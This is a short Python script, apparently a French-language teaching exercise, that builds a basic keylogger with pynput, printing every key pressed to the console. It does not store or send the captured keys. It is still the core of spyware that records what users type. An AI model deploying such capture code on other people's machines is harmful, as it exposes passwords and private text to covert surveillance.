import pynput
import pynput.keyboard


# Créer la méthode processkeys(key) qui prend comme paramètre une touche du clavier sur laquelle on a appuyé, affiche sa valeur.
def processkeys(key):
    try:
        print(f'Touche appuyée: {key.char}')
    except AttributeError:
        print(f'Touche spéciale appuyée: {key}')


# 6.1. Déclarez une variable keyboard_listener qui va contenir le résultat de l'appel de la fonction pynput.keyboard.Listener()
keyboard_listener = pynput.keyboard.Listener(on_press=processkeys)


# Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.
def start_keylogger():
    # Démarre l'écouteur en arrière-plan
    keyboard_listener.start()
    # Attend que l'écouteur se termine (bloque le programme)
    keyboard_listener.join()


if __name__ == "__main__":
    start_keylogger()

